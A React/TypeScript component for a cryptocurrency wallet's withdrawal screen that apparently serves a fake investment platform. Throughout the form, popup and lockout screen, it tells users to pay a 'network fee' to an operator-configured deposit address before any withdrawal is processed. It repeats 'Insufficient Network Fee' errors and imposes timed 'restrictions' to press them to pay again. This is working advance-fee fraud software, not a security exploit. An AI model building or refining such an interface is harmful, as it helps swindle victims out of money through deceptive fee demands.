import React, { useEffect, useId, useState, useRef, useCallback } from 'react';
import { ArrowLeft, AlertCircle, Copy, X, Clock, CheckCircle } from 'lucide-react';
import { ViewState } from '../App';
import { AssetType } from '../store';
import { api, WalletData, SettingsData } from '../api';
import { toast } from 'sonner';

// ── Lockout persistence (per-username, survives page refresh) ─────────────────

const LOCKOUT_KEY = 'trant_withdraw_lockout';
const MAX_ATTEMPTS = 3;
const LOCKOUT_SECONDS = 5 * 60; // 5 minutes

interface LockoutState {
  attempts: number;
  lockedUntil: number | null; // epoch ms
}

function getLockout(username: string): LockoutState {
  try {
    const raw = localStorage.getItem(`${LOCKOUT_KEY}_${username}`);
    if (!raw) return { attempts: 0, lockedUntil: null };
    return JSON.parse(raw);
  } catch {
    return { attempts: 0, lockedUntil: null };
  }
}

function saveLockout(username: string, state: LockoutState) {
  localStorage.setItem(`${LOCKOUT_KEY}_${username}`, JSON.stringify(state));
}

function clearLockout(username: string) {
  localStorage.removeItem(`${LOCKOUT_KEY}_${username}`);
}

// ── Fee Popup ─────────────────────────────────────────────────────────────────

interface FeePopupProps {
  feeInAsset: number;
  assetLabel: string;
  feeAddress: string;
  feeUsd: number;
  onClose: () => void;
}

function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePopupProps) {
  const handleCopy = () => {
    navigator.clipboard.writeText(feeAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-5">
      <div className="w-full max-w-[390px] bg-card border border-destructive/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-destructive/15 flex items-center justify-center shrink-0">
              <AlertCircle className="w-5 h-5 text-destructive" />
            </div>
            <h2 className="text-base font-bold text-foreground">Network Fee Required</h2>
          </div>
          <button onClick={onClose} className="p-1 text-muted hover:text-foreground transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <p className="text-sm text-muted leading-relaxed">
          Before your withdrawal can be processed, you must clear the network fee below. Send the exact amount to the address provided.
        </p>

        <div className="bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3">
          <div className="flex flex-col gap-1">
            <span className="text-xs text-muted uppercase tracking-widest font-medium">Amount Due</span>
            <span className="text-2xl font-bold text-destructive">
              {feeInAsset} {assetLabel}
              <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
            </span>
          </div>
          <div className="flex flex-col gap-1">
            <span className="text-xs text-muted uppercase tracking-widest font-medium">Send Fee To</span>
            <button
              onClick={handleCopy}
              className="flex items-center gap-2 bg-background/60 border border-border/60 rounded-xl px-3 py-2.5 text-left hover:bg-background transition-colors"
            >
              <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeAddress}</span>
              <Copy className="w-4 h-4 text-muted shrink-0" />
            </button>
          </div>
        </div>

        <button
          onClick={onClose}
          className="w-full bg-destructive hover:bg-destructive/90 text-white font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
        >
          Got it — I'll pay the fee
        </button>
      </div>
    </div>
  );
}

// ── Countdown display ─────────────────────────────────────────────────────────

function useCountdown(lockedUntil: number | null, onExpire: () => void) {
  const [remaining, setRemaining] = useState(0);
  const cbRef = useRef(onExpire);
  cbRef.current = onExpire;

  useEffect(() => {
    if (!lockedUntil) { setRemaining(0); return; }
    const tick = () => {
      const secs = Math.max(0, Math.ceil((lockedUntil - Date.now()) / 1000));
      setRemaining(secs);
      if (secs === 0) cbRef.current();
    };
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [lockedUntil]);

  return remaining;
}

// ── Main component ────────────────────────────────────────────────────────────

interface SendWithdrawViewProps {
  asset: AssetType;
  onNavigate: (view: ViewState, asset?: AssetType) => void;
}

export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
  const checkboxId = useId();
  const [wallet, setWallet] = useState<WalletData | null>(null);
  const [settings, setSettings] = useState<SettingsData | null>(null);
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
  const [showFeePopup, setShowFeePopup] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [feeError, setFeeError] = useState('');

  // Lockout state
  const [lockout, setLockout] = useState<LockoutState>({ attempts: 0, lockedUntil: null });

  // Resolve username from wallet user_id — we use a stable key from localStorage
  // The lockout key is per-user based on wallet user_id stored at load
  const userKey = useRef<string>('anonymous');

  useEffect(() => {
    Promise.all([api.getWallet(), api.getSettings()])
      .then(([w, s]) => {
        setWallet(w);
        setSettings(s);
        // Derive a stable per-user key
        userKey.current = w.user_id != null ? `uid_${w.user_id}` : 'anonymous';
        setLockout(getLockout(userKey.current));
      })
      .catch(() => toast.error('Failed to load wallet data'))
      .finally(() => setLoading(false));
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      api.getSettings().then(s => setSettings(s)).catch(() => {});
      api.getWallet().then(w => setWallet(w)).catch(() => {});
    }, 15_000);
    return () => clearInterval(interval);
  }, []);

  // Countdown timer — called when lockout expires
  const handleLockoutExpired = useCallback(() => {
    const fresh = { attempts: 0, lockedUntil: null };
    setLockout(fresh);
    saveLockout(userKey.current, fresh);
  }, []);

  const remainingSecs = useCountdown(lockout.lockedUntil, handleLockoutExpired);
  const isLocked = lockout.lockedUntil !== null && remainingSecs > 0;

  const formatCountdown = (secs: number) => {
    const m = Math.floor(secs / 60).toString().padStart(2, '0');
    const s = (secs % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  };

  if (loading || !wallet || !settings) {
    return (
      <div className="flex flex-col h-full items-center justify-center bg-background">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const maxAmount = wallet[asset] as number;

  const prices: Record<AssetType, number> = {
    btc: settings.btc_price,
    eth: settings.eth_price,
    usdt_trc20: settings.usdt_price,
    usdt_bep20: settings.usdt_price,
    usdt_erc20: settings.usdt_price,
    trx: settings.trx_price,
  };

  const feeDepositAddress: string | null | undefined =
    settings[`deposit_address_${asset}` as keyof SettingsData] as string | null | undefined;

  const isUsdt = asset === 'usdt_trc20' || asset === 'usdt_bep20' || asset === 'usdt_erc20';

  const perCoinFeeKey = `withdrawal_fee_${asset}` as keyof SettingsData;
  const perCoinFeeUsd = (settings[perCoinFeeKey] as number | undefined) ?? 0;
  const feeUsd = perCoinFeeUsd > 0 ? perCoinFeeUsd : settings.gas_fee_usd;

  const feeInAsset: number = isUsdt
    ? parseFloat(feeUsd.toFixed(4))
    : parseFloat((feeUsd / prices[asset]).toFixed(8));

  const assetLabel = (() => {
    switch (asset) {
      case 'usdt_trc20': return 'USDT (TRC20)';
      case 'usdt_bep20': return 'USDT (BEP20)';
      case 'usdt_erc20': return 'USDT (ERC20)';
      default: return asset.toUpperCase();
    }
  })();

  const getAssetName = () => {
    switch (asset) {
      case 'btc': return 'Bitcoin (BTC)';
      case 'eth': return 'Ethereum (ETH)';
      case 'usdt_trc20': return 'Tether USDT (TRC20)';
      case 'usdt_bep20': return 'Tether USDT (BEP20)';
      case 'usdt_erc20': return 'Tether USDT (ERC20)';
      case 'trx': return 'Tron (TRX)';
    }
  };

  // Gas fee section shown when auto-approve is off and a deposit address is configured
  const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress;

  const copyFeeAddress = () => {
    if (!feeDepositAddress) return;
    navigator.clipboard.writeText(feeDepositAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };

  const handleSend = async () => {
    setFeeError('');

    if (isLocked) return;

    if (!address.trim()) {
      toast.error('Please enter a recipient address');
      return;
    }
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
      toast.error('Please enter a valid amount');
      return;
    }
    if (withdrawAmount > maxAmount) {
      toast.error(`Insufficient ${assetLabel} balance`);
      return;
    }

    // Fee checkbox must be ticked if section is shown
    if (showGasFeeSection && !gasFeeAcknowledged) {
      setShowFeePopup(true);
      return;
    }

    setSubmitting(true);
    try {
      await api.requestWithdrawal(asset, withdrawAmount, address.trim());
      // On success clear any lockout
      clearLockout(userKey.current);
      setLockout({ attempts: 0, lockedUntil: null });
      setSubmitted(true);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Transaction failed';

      // Detect fee / not-enabled error from backend (403 or message contains "Insufficient Network Fee")
      const isFeeError = msg.includes('Insufficient Network Fee') || msg.includes('fee');

      if (isFeeError) {
        const current = getLockout(userKey.current);
        const newAttempts = current.attempts + 1;

        if (newAttempts >= MAX_ATTEMPTS) {
          const lockedUntil = Date.now() + LOCKOUT_SECONDS * 1000;
          const next = { attempts: newAttempts, lockedUntil };
          saveLockout(userKey.current, next);
          setLockout(next);
          setFeeError('');
        } else {
          const next = { attempts: newAttempts, lockedUntil: null };
          saveLockout(userKey.current, next);
          setLockout(next);
          const remaining_tries = MAX_ATTEMPTS - newAttempts;
          setFeeError(
            `Insufficient Network Fee. Kindly clear your fee and try again.` +
            (remaining_tries === 1
              ? ' (1 attempt remaining before temporary restriction)'
              : '')
          );
        }
      } else {
        toast.error(msg);
      }
    } finally {
      setSubmitting(false);
    }
  };

  // ── Success screen ────────────────────────────────────────────────────────

  if (submitted) {
    return (
      <div className="flex flex-col h-full bg-background">
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6 text-center">
          <div className="w-20 h-20 rounded-full bg-amber-500/15 flex items-center justify-center">
            <Clock className="w-10 h-10 text-amber-400" />
          </div>
          <div className="flex flex-col gap-2">
            <h2 className="text-xl font-bold text-foreground">Request Submitted</h2>
            <p className="text-muted text-sm leading-relaxed">
              Your withdrawal request has been received and is being processed. You'll be notified once it's completed.
            </p>
          </div>
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="w-full bg-primary hover:bg-primary/90 text-background font-medium rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
          >
            Back to {assetLabel}
          </button>
        </div>
      </div>
    );
  }

  // ── Lockout screen ────────────────────────────────────────────────────────

  if (isLocked) {
    return (
      <div className="flex flex-col h-full bg-background">
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6 text-center">
          <div className="w-20 h-20 rounded-full bg-destructive/15 flex items-center justify-center">
            <Clock className="w-10 h-10 text-destructive" />
          </div>
          <div className="flex flex-col gap-3">
            <h2 className="text-xl font-bold text-foreground">Temporarily Restricted</h2>
            <p className="text-muted text-sm leading-relaxed">
              Multiple failed attempts detected. Please clear your network fee and try again in:
            </p>
            <div className="text-5xl font-bold text-destructive tabular-nums">
              {formatCountdown(remainingSecs)}
            </div>
            <p className="text-xs text-muted">minutes : seconds</p>
          </div>
          <div className="w-full bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3 text-left">
            <div className="text-sm font-semibold text-foreground">Why am I seeing this?</div>
            <p className="text-xs text-muted leading-relaxed">
              You have attempted to withdraw without clearing the required network fee {MAX_ATTEMPTS} times. Clear your network fee first, then return here once the timer expires.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ── Main form ─────────────────────────────────────────────────────────────

  return (
    <>
      <div className="flex flex-col h-full bg-background">
        {/* Header */}
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>

        <div className="flex flex-col flex-1 px-6 py-4 gap-5 overflow-y-auto">

          {/* Asset */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-muted px-1">Asset</label>
            <div className="w-full bg-card/50 border border-border rounded-xl px-4 py-3.5 text-foreground opacity-70">
              {getAssetName()}
            </div>
          </div>

          {/* Recipient */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-muted px-1">Recipient Address</label>
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
              placeholder="Paste wallet address"
            />
          </div>

          {/* Amount */}
          <div className="flex flex-col gap-2">
            <div className="flex justify-between items-center px-1">
              <label className="text-sm text-muted">Amount</label>
              <span
                className="text-xs text-primary font-medium cursor-pointer"
                onClick={() => setAmount(maxAmount.toString())}
              >
                Max
              </span>
            </div>
            <div className="relative">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg"
                placeholder="0.00"
                step="any"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium text-sm">
                {assetLabel}
              </div>
            </div>
            <div className="text-xs text-muted px-1 flex justify-between">
              <span>Available: {maxAmount > 0 ? maxAmount.toLocaleString(undefined, { maximumFractionDigits: 8 }) : '0'} {assetLabel}</span>
              <span>~${(parseFloat(amount || '0') * prices[asset]).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
            </div>
          </div>

          {/* Network Fee section */}
          {showGasFeeSection && (
            <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
              <div className="flex gap-3">
                <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                <div className="flex flex-col gap-1">
                  <div className="text-sm font-semibold text-foreground">Network Fee Required</div>
                  <div className="text-xl font-bold text-destructive">
                    {feeInAsset} {assetLabel}
                    <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
                  </div>
                  <div className="text-xs text-muted/90 leading-relaxed">
                    You must send the network fee to the address below before your withdrawal is processed.
                  </div>
                </div>
              </div>

              <div className="flex flex-col gap-2">
                <span className="text-xs text-muted uppercase tracking-widest font-medium">Send fee to this {assetLabel} address</span>
                <button
                  onClick={copyFeeAddress}
                  className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
                >
                  <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeDepositAddress}</span>
                  <Copy className="w-4 h-4 text-muted shrink-0" />
                </button>
              </div>

              <label htmlFor={checkboxId} className="flex items-start gap-3 cursor-pointer select-none">
                <input
                  id={checkboxId}
                  type="checkbox"
                  checked={gasFeeAcknowledged}
                  onChange={(e) => {
                    setGasFeeAcknowledged(e.target.checked);
                    if (e.target.checked) setFeeError('');
                  }}
                  className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
                />
                <span className="text-xs text-muted leading-relaxed">
                  I confirm I have already sent the network fee of{' '}
                  <span className="text-destructive font-semibold">{feeInAsset} {assetLabel}</span>{' '}
                  to the address above and my withdrawal is ready to be processed.
                </span>
              </label>

              {gasFeeAcknowledged && (
                <div className="rounded-lg bg-success/10 border border-success/30 px-3 py-2.5 flex gap-2 items-center">
                  <CheckCircle className="w-4 h-4 text-success shrink-0" />
                  <p className="text-xs text-success font-medium">Fee confirmed — ready to submit.</p>
                </div>
              )}
            </div>
          )}

          {/* Fee error / attempts warning */}
          {feeError && (
            <div className="rounded-xl border border-destructive/40 bg-destructive/10 px-4 py-3.5 flex gap-3 items-start">
              <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
              <p className="text-sm text-destructive font-medium leading-relaxed">{feeError}</p>
            </div>
          )}

          {/* Submit */}
          <button
            onClick={handleSend}
            disabled={submitting}
            className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
          >
            {submitting ? 'Processing…' : 'Submit Withdrawal Request'}
          </button>

        </div>
      </div>

      {showFeePopup && feeDepositAddress && (
        <FeePopup
          feeInAsset={feeInAsset}
          assetLabel={assetLabel}
          feeAddress={feeDepositAddress}
          feeUsd={feeUsd}
          onClose={() => setShowFeePopup(false)}
        />
      )}
    </>
  );
}
